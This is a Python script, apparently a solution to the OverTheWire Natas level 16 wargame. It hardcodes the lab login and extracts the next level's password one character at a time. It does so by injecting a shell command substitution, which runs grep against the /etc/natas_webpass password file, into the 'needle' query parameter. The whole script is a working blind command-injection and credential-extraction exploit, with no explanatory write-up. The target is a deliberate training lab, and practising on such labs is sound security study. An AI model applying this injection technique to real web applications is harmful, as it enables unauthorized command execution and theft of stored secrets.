#!/bin/python
import requests,string,sys

url = "http://natas16.natas.labs.overthewire.org"
auth_username = "natas16"
auth_password = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh" 

characters = ''.join([string.ascii_letters,string.digits])

# Begin by building a dictionary of characters found in the password
# This will greatly decrease the complexity for our brute force attempts
password = []
for i in range(1,32):
    for char in characters:
        uri = "{0}?needle=$(grep -E ^{1}{2}.* /etc/natas_webpass/natas17)hackers".format(url,''.join(password),char)
        #uri = ''.join([url,'?','needle=','$(grep -E ^',''.join(password),char,'.* /etc/natas_webpass/natas17)hackers'])
        r = requests.get(uri, auth=(auth_username,auth_password))
        #response = r.text.split('<pre>')[1].split('</pre>')[0]
        if 'hackers' not in r.text:
            password.append(char)
            print(''.join(password))
            break
        else: continue
        
        
